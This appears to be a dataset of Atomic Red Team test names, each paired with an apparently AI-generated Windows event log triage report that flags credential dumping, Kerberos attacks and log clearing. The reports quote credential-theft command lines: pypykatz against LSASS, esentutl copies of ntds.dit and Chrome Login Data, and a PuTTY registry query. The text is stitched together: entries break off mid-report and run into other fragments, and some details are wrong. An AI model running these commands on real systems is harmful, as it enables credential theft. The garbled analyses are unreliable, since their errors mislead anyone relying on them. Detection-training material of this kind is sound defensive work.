   - Execution of `hostname.exe` and `whoami.exe` can be innocuous, but combined with other evidence may indicate the attacker is attempting to gather environment information.
   - The process chain involving `powershell.exe` directly manipulates system configurations and attempts to write outputs that could be used for further attacks or data exfiltration.

### Assessment:
- **Suspicious Activity**: Multiple security logs were cleared anonymously along with system and PowerShell logs indicating an attempt to conceal evidence of actions.
- **Malicious PowerShell Script Detected**: Activities such as DLL injection into system paths, registry modification to maintain persistence, and scripting for potential credential theft point towards a sophisticated attempt to compromise the system.

### Recommendation:
1. **Resolution: MALICIOUS**: Given the combination of cleared logs, suspicious PowerShell scripts, and potential credential harvesting indicators, the activity is considered malicious.
   
2. **Immediate Actions:**
   - Isolate the affected host (Server002) from the network.
   - Perform a forensic analysis to trace the activity source and extent of the compromise.
   - Change the credentials for the `admin_test` user and any others potentially affected.
   - Review and tighten access controls for high-risk actions such as PowerShell execution and log clearance.
   - Restore deleted logs if possible using backup solutions and further search for additional indicators on the network.

3. **Long-term Measures:**
   - Implement enhanced monitoring of PowerShell activities and logging.
   - Conduct a thorough review and audit of security policies related to log integrity and system access.
   - Provide security awareness training to administrative users focusing on recognizing and reacting to suspicious activities."
Brute Force:Credential Stuffing using Kerbrute Tool,"### Detailed Analysis of Logs

**1. Indicators of Compromise:**
- Analysis of logs reveals use of the Wevtutil command to clear event logs, as indicated by Event ID 104 in the System log.
- The security logs show Event ID 1102 which suggests that the security event logs were cleared.
- Application of potentially malicious software ""kerbrute"" via PowerShell, as evidenced by Sysmon (Event ID 1) and Windows PowerShell logs. The command executed by PowerShell includes ""kerbrute.exe"" used for brute force attacks on Kerberos.

**2. Significant Findings:**
- **Wevtutil Event Logs Cleared:** The repeated clearing of the event logs (System and Security) using ""wevtutil cl"" is an immediate red flag. Attackers often clear logs to cover their tracks after compromising a system.
- **Unauthorized or Suspicious PowerShell Activity:** PowerShell was used to run a script involving ""kerbrute.exe,"" a known tool for brute force attacks against Kerberos services. This activity is highly suspicious.
- **Exploitation of High Privileges:** The use of the SYSTEM (NT AUTHORITY\SYSTEM) account and high integrity level in launching various processes including the suspicious PowerShell activity suggests potential privilege escalation and misuse.

**3. Contextual Analysis:**
- The consistent use of high privileges, attempts to clear critical logs, and use of a tool associated with brute force attacks align with actions typical of a malicious actor attempting to persist within a system without detection.

### Assessment

**Resolution: MALICIOUS**

The evidence within these logs strongly suggests malicious activity due to:
- Use of the ""wevtutil"" command to clear system and security logs.
- PowerShell execution involving ""kerbrute.exe"" indicates a brute force attack attempt.

LSASS read with pypykatz,"### Detailed Analysis of the Given Windows Event Logs

Upon reviewing the provided log entries from the System, Security, Sysmon, and Windows PowerShell logs, several indications of potentially malicious activity have been identified:

1. **Log Clearing Activities**:
   - The logs reveal multiple instances of log file clearing operations carried out by the user ""admin_test"". Specifically, Event ID 104 from the system log indicates that the System and Windows PowerShell logs were cleared at ""2024-10-20T17:46:04"". Similarly, Event ID 1102 from the security log shows that the security logs were cleared. Clearing event logs is a common tactic used by attackers to hide their tracks and avoid detection.

2. **Use of `wevtutil.exe` for Log Clearing**:
   - Sysmon Event ID 1 and 5 show the execution of `wevtutil.exe` with the ""cl"" (clear log) command for various log channels (""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""System"", and ""Security""). This indicates an attempt to systematically clear log files, which is suspicious behavior, especially when conducted by a regular user or even an admin without proper justification.

3. **Execution of `pypykatz`**:
   - The logs indicate the execution of a command involving ""pypykatz"", seen in Sysmon Event ID 1 (process execution) with the command line: `cmd.exe /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..\ExternalPayloads\venv_t1003_001\Scripts\pypykatz"" live lsa`. The ""pypykatz"" tool is known for its use in extracting credentials from memory, specifically mimicking the capabilities of the malicious tool Mimikatz. Such activity is a strong indicator of credential dumping.

4. **Other Command-Line Tools**:
   - Additional tools such as `whoami.exe` and `hostname.exe` were executed, which could be part of an enumeration phase by an attacker to gather information about the compromised system's current user and hostname.

5. **Consistent Use of `conhost.exe`**:
   - Multiple instances of `conhost.exe` processes being spawned, associated with command line tasks, suggest active command-line usage, potentially hiding malicious operations under typical system activities.

### Assessment and Conclusion

Based on the analysis of the logs, there are definitive indicators of potentially malicious activity. The evidence of log clearing, execution of credential dumping tools, and command-line based enumeration align with tactics, techniques, and procedures (TTPs) often associated with offensive activities and malware behavior.

### Resolution: **MALICIOUS**

Given the clear indicators of credential dumping and log clearing to cover tracks, these activities are highly suspect and indicative of compromise. 

### Recommendations for Further Actions

1. **Containment**:
   - Immediately isolate the affected host (Server002) from the network to prevent further malicious activities or data exfiltration.

2. **Eradication**:
   - Conduct a thorough investigation to identify and remove any malicious tools or scripts found on the system.
   - Review user account activity, focusing on any unauthorized access or privilege escalations.

3. **Recovery**:
   - Restore affected systems from trusted backups.
   - Change credentials for potentially compromised accounts.
   - Apply security patches and harden the system to prevent future attacks.

4. **Post-Incident Analysis**:
   - Analyze how the compromise occurred to improve future detection and response processes.
   - Conduct a review of security monitoring and incident response protocols to address any gaps or improvements.

5. **Continuous Monitoring**:
   - Increase the logging and monitoring of critical systems for any further suspicious activities.
   - Implement proactive threat-hunting practices to identify and mitigate risks proactively."
Cached Credential Dump via Cmdkey,"Upon analysis of the provided event logs, several indicators suggest potentially suspicious activities. Here are the main observations:

1. **Log Cleared Events**: 
   - There are multiple instances where the logs have been cleared using the `wevtutil.exe` tool, specifically events with ID `104` in the System log, indicating that the System and Windows PowerShell logs were cleared. Additionally, Security log clearing is captured by Event ID `1102`.
   - User ""admin_test"" appears to be responsible for these actions, which are typically associated with attempts to cover up malicious actions, as it prevents forensic analysis of historical events in the system.

2. **Usage of High Privileges**: 
   - Event ID `4672` in the Security log shows that ""admin_test"" utilized multiple high-level privileges such as `SeSecurityPrivilege`, `SeBackupPrivilege`, and others including `SeDebugPrivilege`, which can be particularly dangerous if misused by an attacker to manipulate system states or modify sensitive security settings.

3. **Unusual Logon**: 
   - Events with ID `4624` and `4634` involve ""admin_test"" logging in using NTLM authentication from a workstation named `DESKTOP-3HL5B2P`. While not inherently suspicious, in the context of other events, this logon could indicate unauthorized access.

4. **Command-Line Activity**: 
   - The execution of `cmd.exe` with `/c cmdkey /list` and the subsequent use of `cmdkey.exe` seen in Sysmon logs show an attempt to list credentials, which could indicate credential harvesting.
   - The use of `whoami.exe` and `hostname.exe` suggests reconnaissance activity to gather information about the system environment.

5. **Software Updates**:
   - The Windows Update activities involving `wuauclt.exe`, `AM_Delta.exe`, and `MpSigStub.exe` match the normal update process for Windows Defender Antivirus, indicating that these updates are benign in isolation. However, they are timestamped near other suspicious activities, which could potentially be used to blend in.

### Assessment:
The combination of log clearing, usage of high privileges, unusual logon, and credential enumeration strongly suggests that these activities may not be typical administrative tasks. Given the context and the patterns observed, there is enough ground to classify the activities as:

**Resolution: SUSPICIOUS**

### Recommendations:
1. **Immediate Action**: 
   - Investigate the user account ""admin_test"" to determine the legitimacy of the activities.
   - Check for any unauthorized access or compromise of this account.
  
2. **Further Investigation**: 
   - Analyze network traffic related to the specific logon session and workstation to check for any data exfiltration.
   - Search for additional indicators of compromise across other hosts in the network.

3. **Hardening Measures**: 
   - Implement stricter logging and monitoring for administrative actions, particularly those involving log clearing.
   - Consider using more robust authentication methods (e.g., MFA) and limiting NTLM usage.

4. **Forensic Imaging**: 
   - Consider creating a forensic image of the system for further detailed analysis and to preserve the state for future reference if escalation is required."
WinPwn - SessionGopher,"After completing a comprehensive analysis of the provided logs, the following observations and conclusions are noted:

### Key Observations:
1. **Log Clearing Events:**
   - Multiple log entries indicate that event logs for System, Windows PowerShell, and Security channels were cleared by the user `admin_test`. The use of `wevtutil.exe` to clear logs is evident. Clearing logs is a common tactic used by attackers to cover tracks, especially when it involves security logs (Event ID 1102).

2. **PowerShell Script Execution:**
   - There is a suspicious PowerShell script execution by `admin_test` involving the execution of a script from a GitHub repository (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`). This repository is associated with offensive security tools, which could indicate malicious intent.

3. **System Time Changes:**
   - The system time was adjusted multiple times. While this could be benign and related to time synchronization, in conjunction with log clearing actions, it could suggest an attempt to manipulate log timestamps.

4. **Sysmon Logs:**
   - Multiple process creations are seen using known Windows binaries like `whoami.exe` and `HOSTNAME.EXE`. While these commands themselves are not inherently malicious, their timing relative to other suspicious activities suggests potential misuse or reconnaissance activities.

5. **Edge Updates:**
   - Several events showing activities related to Microsoft Edge updates and installations by the `NT AUTHORITY\SYSTEM` user. This appears routine and does not exhibit direct signs of compromise.

### Conclusion and Risk Assessment:
Based on the above observations, there are events that strongly suggest suspicious or potentially malicious activity:
- The use of the `wevtutil.exe` utility by the user `admin_test` to clear event logs is a definitive red flag.
- The download and execution of a PowerShell script from an external source related to security exploitation tools necessitates further investigation.
- Changes in system time along with attempts to clear logs could denote attempts to cover tracks.

### Resolution:
**Resolution:** MALICIOUS

**Guidance on How to Proceed:**
- **Immediate Actions:**
  - Isolate the affected host (Server002) from the network to prevent further potential damage or data exfiltration.
  - Perform a memory and filesystem forensic analysis to investigate any malware or additional suspicious artifacts.
  - Change all credentials associated with `admin_test` and review audit logs for unauthorized accesses across other systems.
- **Medium to Long Term Actions:**
  - Review and enhance logging policies to ensure tamper-evident logs are available.
  - Implement and enforce stricter PowerShell execution policies using device guard and credentials guard.
  - Conduct a company-wide phishing and security awareness training to prevent potential ingress points.
  
Given the evidence of log clearing activities and suspicious script executions, these actions indicate a need for comprehensive incident response and remediation steps to ensure corporate network integrity and security."
Enumeration for PuTTY Credentials in Registry,"### Detailed Analysis:

Upon reviewing the provided Windows event logs, several areas of concern regarding potential malicious activity are identified:

1. **Event Log Clearing:**
   - **Security Event ID 1102:**
     - The event logs indicate that three different logs (Security, System, and Windows PowerShell) were cleared by the user `admin_test`. This action is often used to cover tracks post compromise, as clearing logs removes evidence of malicious activity. The use of the `wevtutil.exe` command-line utility to clear logs is concerning, especially without a legitimate reason.

2. **Time Change Events:**
   - **Security Event ID 4616:**
     - The system time was adjusted twice by the `LOCAL SERVICE` account, and `svchost.exe` was involved in the process. Time changes can be used by attackers to manipulate log timestamps to avoid detection. It's unusual for the system time to be changed within such a short interval, suggesting potential manipulation.

3. **Highly Privileged Session:**
   - **Security Event ID 4672:**
     - The user `admin_test` was granted a series of high privileges (e.g., SeDebugPrivilege, SeTakeOwnershipPrivilege). This was shortly followed by event log clearings and system time changes - typical post-exploitation activities to maintain control and evade detection.

4. **Unusual Command Line Execution:**
   - **Sysmon Event ID 1 and 5:**
     - The execution of the process `cmd.exe` with arguments querying registry settings for PuTTY sessions (`reg query HKCU\Software\SimonTatham\PuTTY\Sessions`). Such registry queries are common reconnaissance techniques to gather information about SSH sessions stored by the PuTTY application, potentially indicating an attacker gathering credentials or other sensitive information.

### Assessment:

From the analysis above, the series of activities observed appear coordinated and suspicious, aligning with common techniques in the cyber kill chain, particularly evidencing post-exploitation behavior:

- **Process Execution and Command-Line Arguments**: Unusual command-line arguments and the execution of registry queries suggest information gathering.
- **Log Clearing and Time Manipulation**: Indicates attempts to hide malicious activity.
- **Privilege Escalation**: High-level privileges were assigned to the suspicious account shortly before sophisticated actions were carried out.

### Conclusion:

Given the indicators such as privileged account usage, event log clearing actions, time manipulation, and registry queries, this sequence of events suggests that **malicious activity** has likely occurred on the host `Server002`.

### Resolution:

- **Resolution: MALICIOUS**

### Guidance:

1. **Immediate Containment**: Isolate the affected host (`Server002`) from the network to prevent further spread or data exfiltration.
2. **Forensic Analysis**: Conduct a thorough forensic analysis on the host to confirm the activities and to identify potential backdoors or persistence mechanisms used by the attacker.
3. **Review User Accounts**: Audit all privileged accounts, particularly focusing on `admin_test`, to ensure they are secure and that no unauthorized accounts have been created.
4. **Restore System**: If malicious activity is confirmed, consider restoring the affected system from clean backups.
5. **Security Monitoring**: Enhance monitoring around critical systems and privileged accounts, possibly employing additional sensors or logging to identify further anomalies."
Create Volume Shadow Copy with Powershell,"Upon reviewing the provided Windows event logs, a few details raise concerns regarding potential suspicious or malicious activities:

**1. Time Manipulation Detection:**
- There are several `Event ID: 4616` events in the security log, indicating that the system time was changed. This could be an attempt to manipulate timestamps in logs, commonly associated with covering malicious activities.
- The `Kernel-General log (Event ID: 1)` corroborates the time change, which is significant because altering system time can impact event log timestamps meant for evidence collection.

**2. PowerShell Command Execution:**
- Several PowerShell events indicate the execution of `powershell.exe` with the command `(gwmi -list win32_shadowcopy).Create('C:\\','ClientAccessible')`. While using PowerShell for shadow copy creation is not inherently malicious, it can be indicative of preparation for activities like data exfiltration or tampering.

**3. Clearing of Event Logs:**
- Security and system logs have been cleared (Security log `Event ID: 1102` and System log `Event ID: 104`). This is a strong indicator of malicious activity as attackers often clear logs to erase their tracks after unauthorized activity.

**4. Process Execution:**
- The command `wevtutil.exe cl` recurrently appears, which is typically used to clear event logs. This supports the logs already cleared suspicion.
- The use of `wevtutil` from within a personal user directory adds to the suspicion.

**5. Privilege Escalation:**
- There are multiple `Event ID: 4672` indicating special privilege assignment. While regular, it's crucial to confirm that these are expected and sanctioned actions.

**6. Network/Accounts:**
- Numerous access and account activities involving `S-1-5-18` and server processes, such as `VSSVC.exe`, require investigation to verify if they are standard operations or could imply misuse.

**7. Connection from External Device:**
- Logon events show activity from the external IP (192.168.0.102), which could be part of a standard configuration but warrants scrutiny to ensure it is not unauthorized access.

**Assessment:**
Based on the evidence, the logs indicate potential unauthorized and malicious activities. Key markers include time manipulation, event log clearance, and suspicious PowerShell commands. While we cannot categorically assert the presence of malicious intent without further inquiry, these entries strongly suggest it.

**Resolution: MALICIOUS**

**Guidance:**
- Immediately investigate the source and intent of the PowerShell command execution and log clearance actions.
- Review system time changes and validate if these are part of administrative activity or potentially malicious.
- Conduct a more thorough forensic investigation to establish a timeline of activities and potentially recover any cleared logs.
- Increase monitoring on the host and possibly isolate it to prevent further potential compromise while investigations are ongoing.
- Review and secure access controls, especially validating any contextual logons like the one from the IP `192.168.0.102`."
Steal Chrome Cookies (Windows),"Upon reviewing the provided logs, several indicators of potentially malicious activity can be identified. Here's a detailed breakdown of the findings:

1. **Log File Clearing:**
   - **System and Security Logs Cleared:** The system logs show that the event logs for the System, Windows PowerShell, and Security channels were cleared by a user named `admin_test`. Log clearing activity often indicates a deliberate attempt to cover tracks, which can be a strong indicator of malicious behavior.

2. **PowerShell Usage:**
   - **Suspicious PowerShell Command:** Multiple logs indicate the execution of a PowerShell command that stops the Chrome process and runs an SQLite query on the Chrome cookies database. This is followed by writing out the output to a known directory structure associated with Atomic Red Team (a well-known adversary simulation framework). The use of PowerShell to interact with browser data is a potential indication of credential or data theft.

3. **Sysmon Logs:**
   - **Unusual Process Activity:** The Sysmon logs show a series of process creation events originating from PowerShell, cmd.exe, and an SQLite utility, all executed by the `admin_test` user context. These processes appear to support the activity observed with PowerShell, reinforcing suspicions of data extraction or manipulation.
   - **Edge Update Processes:** While the Edge Update processes are commonly benign system maintenance activities, their closeness in timing to other suspicious activities leads to potential obfuscation considerations. However, there is no direct evidence of these being used maliciously in the logs provided.

4. **Lateral Movement Indicators:**
   - **High-Integrity Execution Contexts:** Many processes operate at a high integrity level, which can imply administrative capabilities. Combined with the activity patterns observed, this could suggest attempts at deeper system penetration or persistence mechanisms.

**Assessment:**
- The combination of log clearance events, the manner of PowerShell script execution, and the process creation patterns all point to an elevated risk of malicious activity aimed at data extraction or reconnaissance.

**Resolution: MALICIOUS**
- The activities captured in the logs align with known malicious tactics, techniques, and procedures (TTPs), including log deception and credential or data theft via PowerShell scripts.

**Guidance on How to Proceed:**
- **Immediate Investigation:** Conduct a detailed analysis of the user `admin_test`, focusing on access logs, recent changes, and anomalies surrounding this account.
- **Endpoint Isolation:** Isolate the system `Server002` to prevent potential lateral movement.

Create Volume Shadow Copy remotely (WMI) with esentutl,"Upon reviewing the provided Windows event logs across the Application, Security, Sysmon, and System logs, several red flags and suspicious activities have emerged that warrant further exploration:

### 1. **Log File Clearance:**
- **Security Log (EventID 1102):** This logs an event where the security log was cleared by a user named ""admin_test."" Clearing logs is typically associated with attempts to cover tracks following unauthorized activities or exploitation.
- **System Log (EventID 104):** Similar log clearance events for the System and Windows PowerShell logs by ""admin_test"" were detected. The systematic clearing of multiple logs is highly suspicious and indicative of potential malicious activity.

### 2. **Usage of `wevtutil.exe`:**
- **Sysmon Log (EventID 1):** The `wevtutil.exe` command-line utility was used multiple times to clear multiple event logs including the Security log. The command-lines referenced `""wevtutil.exe"" cl Security/Application/System` which aligns with the log clearing events noted.

### 3. **Potential Unauthorized Data Extraction:**
- **Sysmon Log (EventID 1 & 5):** Commands such as `esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\ntds.dit` were executed. This command is known for being leveraged in ""NTDS.dit"" file extraction, which could be used to access sensitive data like password hashes.
- **Command Line Pattern:** A batch of `cmd.exe` instances facilitated by WMIC and followed by esentutl.exe executions indicate potential malicious batch operations orchestrating data extraction.

### 4. **Privilege Escalation Attempt:**
- **Security Log (EventID 4799):** The user ""admin_test"" was involved in activities escalating privileges (e.g., making changes to the ""Administrators"" group).

### Summary and Assessment:
The combination of systematic log clearing by an administrative account, execution of utilities often used in data extraction activities, and signs of unauthorized privilege escalation are strong indicators of a potentially compromised environment. The suspect use of `esentutl.exe` and frequent `cmd.exe` execution patterns reinforce this hypothesis.

### Resolution:
Given these findings, the conclusion is **MALICIOUS**. There is apparent malicious activity with significant indicators including attempts to extract sensitive information, cover tracks via log deletion, and unauthorized administrative actions.

Password Spray using Kerbrute Tool,"Upon reviewing the provided logs, several key observations can be drawn that point to potentially suspicious and possibly malicious activities:

### Summary of Observations

1. **Registry and Event Log Clearing**:
   - There are multiple instances of event log clearing in the Sysmon log (EventID 1102) in both the Security and System log files, executed by the user ""admin_test"". Log clearing activity can be a tactic used by threat actors to cover up tracks after malicious activities.

2. **Use of Suspicious Tools and Commands**:
   - There is a PowerShell execution using `kerbrute.exe` for a password spraying activity as observed in the `Windows PowerShell log`. This tool and its associated command are often used for brute force attacks against Active Directory environments to discover valid user credentials.

3. **Suspicious Process Creation**:
   - Numerous instances of `wevtutil.exe` and `conhost.exe` are being utilized which often is used in conjunction with event log manipulation and clearance. The consistent use of high integrity process executions and manipulation of event logs suggests an intent to erase evidence of operations from log files.

4. **Correlation with Security Logs**:
   - Security logs show possible credential-awarding processes and repeated attempts that correlate with automated attacks such as seen in brute force scenarios.

5. **Security Software Status**:
   - Windows Defender is reported to be on and possibly monitoring for threats, however, specific actions to prevent the aforementioned suspicious activities were not observed in these logs.

### Threat Assessment

- **Clearing of Event Logs**: Admin account activity clearing logs is highly suspicious and often associated with attempts to conceal unauthorized activities.
- **Execution of `kerbrute.exe` for Password Spraying**: This is a direct indicator of potential malicious activity, often intending to gain unauthorized access to multiple accounts through brute force means.

### Resolution

Based on these findings, the situation can be categorized as **MALICIOUS**. The identified activities—event log clearing using admin privileges, use of unauthorized and known attack tools such as Kerbrute for password spraying, and attempts to manipulate logging mechanisms—are strong indicators of a compromise or an active attempt at one.

### Recommendations

1. **Immediate Incident Response**:
   - Discontinue all user sessions associated with ""admin_test"" and any other potentially compromised accounts.

    - Multiple instances of `wevtutil.exe` executed with the `cl` (clear) command targeting the ""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""System"", ""Security"", and ""Windows PowerShell"" logs at highly irregular, overlapping times. Clearing event logs is often a tactic employed by attackers to cover tracks after conducting malicious activity.

2. **Suspicious Command Line in CMD Execution:**
    - An execution of `cmd.exe` with the command involving `esentutl.exe` was observed using paths typical for credential extraction attack techniques (T1555.003 from MITRE ATT&CK), specifically:
        ```
        ""cmd.exe"" /c esentutl.exe /y ""%%LOCALAPPDATA%%\\Google\\Chrome\\User Data\\Default\\Login Data"" /d ""%%temp%%\\T1555.003_Login_Data.tmp""
        ```
    - This indicates the potential attempt to extract login data from Google Chrome, which aligns with credential dumping activities.

3. **Sequence and Timing of Events:**
    - The rapid sequence of various executions (`powershell.exe`, `wevtutil.exe`, and other system utilities) in a short timeframe suggests automated activity, possibly a script or malware running in the system with the intent of data exfiltration or manipulation.
    
4. **Log Clearing Activities:**
    - Explicit log clearing for the Security, System, and Windows PowerShell logs denotes intentional concealment of audit trails and accountability associated operations.

5. **High Privilege Execution Context:**
    - Many of these activities are executed with a ""High"" integrity level, indicating they have elevated privileges, further supporting concerns of unauthorized access or misuse.

**Assessment:**
The combination of the clearing of event logs, credential dumping techniques, and use of legitimate tools for malicious purposes strongly indicates unauthorized and malicious activity.

**Resolution: MALICIOUS**
The evidence indicates a high confidence of malicious behavior. Immediate actions should include:

- Conducting a full forensic analysis on `Server002`.
- Identifying the entry-point of the compromise.
- Resetting credentials and checking other hosts for similar patterns.
- Updating threat detection mechanisms to catch such behavior earlier.
- Reporting the incident per company policy and industry regulations."
Create Symlink to Volume Shadow Copy,"### Detailed Analysis of the Logs:

1. **Event Logs Clearing:**
   - The logs indicate multiple instances of the `wevtutil.exe` being executed to clear logs (EventID: 104 from Microsoft-Windows-Eventlog for System, Windows PowerShell, Security).
   - Specifically, the `admin_test` user executed the command `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`, `wevtutil.exe cl Application`, `wevtutil.exe cl System`, and `wevtutil.exe cl Security`.
   - Corresponding Sysmon logs show the execution of these commands at very close intervals, all by the user `admin_test`.
   - The clearing of event logs, especially the Security log (EventID: 1102) by `admin_test`, is a red flag and often indicative of an attempt to cover tracks.

2. **Suspicious Command Execution:**
   - A command execution involving `cmd.exe` to run `vssadmin.exe create shadow` is noted. This is a technique often used for creating backups that might be leveraged to bypass defenses.
   - The command also includes `mklink` to create a directory junction to the snapshot which is suspicious and potentially indicative of anti-forensics activity.

3. **Privilege Escalation:**
   - The security logs highlight privileges attached to the `admin_test` user during login. This includes privileges such as SeDebugPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, which provide extensive power over the system's operations.
   - The simultaneous high-level privileges and the actions taken potentially indicate an overprivileged account or misuse of an administrative account.

4. **Other Activity:**
   - The logs include several entries related to routine updates, such as Microsoft Defender Antivirus updates and Windows system updates. These do not show direct indication of malicious activity and are likely routine operations.
   - Activity from processes such as `taskhostw.exe`, `wuauclt.exe`, and Microsoft-related update processes is likely non-malicious.

### Assessment:
The logs demonstrate several signs that deviate from standard, legitimate system operations:

- The clearing of critical logs, especially the Security log, by `admin_test` is highly suspicious.
- The `vssadmin.exe` command execution in conjunction with `mklink` carries indications of potential shadow copy exploitation or related activities.

### Resolution:
**MALICIOUS** - The combination of log clearing activities, suspicious command execution, and high-level privileges indicates a potential breach or compromised account. This requires immediate investigation and intervention.

### Guidance:

1. **Immediate Steps:**
   - Temporarily disable the `admin_test` account and change associated passwords.
   - Begin a full forensic investigation, preserving the state of the system for evidence.

Rubeus asreproast,"In reviewing the provided Windows event logs, a detailed analysis highlights several activities and behaviors that stand out and indicate potential malicious activity:

### Analysis of Logs

1. **Application Log:**
   - **Windows Defender State:** Multiple entries show Windows Defender is active (`SECURITY_PRODUCT_STATE_ON`). This is expected for normal operations, but it doesn't prove a system hasn't been compromised.
   - **Security SPP Entries:** Regular entries related to the Software Protection Platform Service with no immediate signs of malicious intent.

2. **Sysmon Log:**
   - **Execution of Tools:** 
     - **PowerShell Execution:** `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` executed several times. Notably, there was execution for running `Wevtutil` to clear specific logs (`Sysmon/Operational`, `Application`, `Security`, and `Windows PowerShell` channel logs). This activity is suspicious because clearing logs is a common tactic used by attackers to cover their tracks.
   - **Rubeus Execution:** A process indicates an attempt to execute `rubeus.exe` with a command for `asreproast`, targeting Kerberos ticket retrieval. This is a typical action in post-exploit phases of attacks, often used to perform Kerberos attacks (e.g., password cracking).
   - **Log Clearing:** Security log indicates that `admin_test` deliberately cleared logs, corroborating potential cover-up activities typically associated with malicious actions.

3. **Security Log:**
   - **Log Cleared Event (`EventID 1102`)**: Direct indication of a log being cleared by the user `admin_test`, using the process ID associated with `wevtutil.exe`. This aligns with the suspicious actions noted from Sysmon logs.

4. **Windows PowerShell Log:**
   - Similar to Sysmon, PowerShell logs detail the execution of scripts and tools to obtain potentially sensitive credentials or data from the system using known offensive tools like `Rubeus`.

5. **System Log:**
   - **System Log Cleared (`EventID 104`)**: Another confirmation that the system logs were cleared intentionally by the `admin_test` user, further aligning with suspicious behaviors noted.

### Assessment

The combination of these logs strongly suggests that there may be illicit activity associated with ""admin_test"" or potentially an attacker masquerading as this account. The clearing of logs, execution of tools like `Rubeus` for Kerberos-related attacks, and use of PowerShell to execute potentially dangerous scripts all present significant red flags indicative of a compromised system and potentially malicious intent.

Upon reviewing the provided Windows event logs, there are indicators of potential compromise related to malicious activity. Below are the key observations:

#### PowerShell Logs:
- There are multiple instances of PowerShell executing commands that are indicative of a ""Golden Ticket"" attack, a type of Kerberos ticket forging attack used to impersonate any user on the network.
- The executed commands involve the use of `rubeus.exe`, a well-known tool used for Kerberos-related attacks, particularly ticket elevation and manipulation.
- Removing temporary batch files and waiting for a specific output indicates attempts to obfuscate the actions and potentially avoid logging or detection.
  
#### Sysmon Logs:
- The execution of `powershell.exe` was observed, which matches the PowerShell log entries for the Golden Ticket activity.
- Additionally, there are logs showing the clearing of event logs (`wevtutil.exe` command lines), an action often taken by attackers after malicious activity to remove traces of their intrusion.
- The `cmd.exe` is used to execute `rubeus.exe`, matching the suspicious PowerShell activity.
- The `runas.exe` utility was used to execute a batch file with administrative privileges, indicating attempts for privilege escalation or lateral movement.

#### Security Logs:
- There is evidence of log clearing, with events showing the security logs being cleared likely to hide malicious activity.
- The session in which privileged commands were executed included several high-level privileges (e.g., SeDebugPrivilege), typically not available to standard users unless privilege escalation has been achieved.
- Multiple login sessions with elevated tokens (indicating administrative level access) were logged.

#### System Logs:
- Logs indicate the clearing of important event logs including the System and PowerShell event channels. This is a significant indicator of suspicious behavior, as it indicates deliberate attempts to remove traces and make forensic analysis more difficult.

### Assessment:
This review has found clear indicators of a **Golden Ticket** attack being attempted or performed on `Server002`. The activity highlighted by the suspicious PowerShell commands, coupled with Sysmon entries showing `rubeus.exe` execution and event log clearing, strongly suggests malicious intent and activities in line with an advanced compromise.

### Resolution:
**MALICIOUS** - Logs contain activity that is evidently malicious.

### Guidance on How to Proceed:
1. **Immediate Containment:** 
   - Isolate Server002 from the network to prevent further compromise or lateral movement.
   - Reset passwords for all potentially affected accounts, especially those with administrative privileges.

2. **Detailed Forensic Analysis:**
   - Conduct a full forensic analysis of Server002, including a memory dump and disk image for offline analysis.
   - Review all systems that may have been accessed using the compromised tickets.

3. **Remediation Steps:**
   - Investigate how `rubeus.exe` was introduced into the system and remove any similar tools.
   - Install or enhance endpoint detection and response (EDR) tools to better monitor such activities.

4. **Event Log Monitoring:**
   - Implement more robust security monitoring and establish triggers for unusual PowerShell activities and event log clearing attempts.

5. **Security Hardening:**
   - Enforce strict least privilege access policies and apply immediate patches to all Kerberos and operating system vulnerabilities.
    
By addressing these points, further incidents can be mitigated and the security posture of the organization can be enhanced to protect against similar attacks in the future."
Password Cracking with Hashcat,"In analyzing the provided logs, several events stand out as suspicious or potentially indicative of malicious activity. Here is a detailed breakdown of the suspicious or anomalous behavior observed:

1. **Log Clearing Activity:**
   - **Event ID 1102 in the Security log** indicates that the security log was cleared by the user `admin_test`. This is often a red flag since attackers may clear logs to hide their activity.

2. **Unusual Process Execution:**
   - The logs show multiple instances of the use of `cmd.exe`, `wevtutil.exe`, and `conhost.exe` by the user `admin_test`. Specifically:
     - `sysmon` Event ID 1 shows `cmd.exe` being used to execute commands that include paths related to `hashcat`, a known password recovery tool. This suggests a potential password brute-forcing attempt.
     - Execution of `wevtutil.exe` (Windows Event Log Management Utility) with commands that indicate clearing logs (`cl` command). This action aligns with the clearing of logs noted in the `Security` and `System` logs.

3. **Privilege Use:**
   - **Event ID 4672** indicates special privileges were assigned to the user `SYSTEM`, which includes a wide range of powerful privileges. While this may be normal, the timing coincides with other suspicious activities.

4. **Hashcat Execution:**
   - There are events showing the use of `hashcat` with the admin account (`admin_test`). `hashcat` is typically used for password cracking, which could indicate an attempt to compromise passwords on the system.

5. **PowerShell and Command-line Usage:**
   - The use of PowerShell and Command-line interfaces in a manner aligning with malicious scripts, specifically targeting paths related to password files, implies possible unauthorized password cracking or testing activities.

### Assessment:

Based on the analysis, it appears that the logs do indeed indicate potential malicious activity. The combination of cleared logs, use of password recovery tools, and atypical use of system utilities suggests a possible compromise of the system. The activities are consistent with tactics used by an attacker who has gained access and is attempting to expand access or remain undetected.

### Resolution:

**MALICIOUS** - The events in the logs indicate clear signs of malicious behavior with the intent to potentially compromise the system. Immediate response measures should be taken.

### Guidance:

1. **Containment:**
   - Isolate the affected host (`Server002`) from the network to prevent any further lateral movement or data exfiltration by the potential attacker.

2. **Investigation:**
   - Conduct a detailed forensic analysis, including a review of historical logs, file integrity checks, and a full system audit to identify and document the scope of the activity.

3. **Eradication and Recovery:**
   - Remove any unauthorized tools or scripts identified during the investigation.
   - Consider rebuilding the system if compromise is confirmed to ensure integrity.

4. **Review and Reinforcement:**
   - Review security policies regarding the use of administrative accounts and command-line tools.
   - Implement enhanced logging and monitoring, including alerts for log tampering or suspicious tool usage.

5. **Communication:**
   - Notify appropriate teams and stakeholders regarding the incident and potential implications for security postures.

This incident warrants immediate escalation and incident response action to mitigate any potential breach successfully."
Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos),"Upon reviewing the Windows event logs provided, there are multiple indicators that suggest the presence of malicious activity:

1. **Event Log Clearing**:
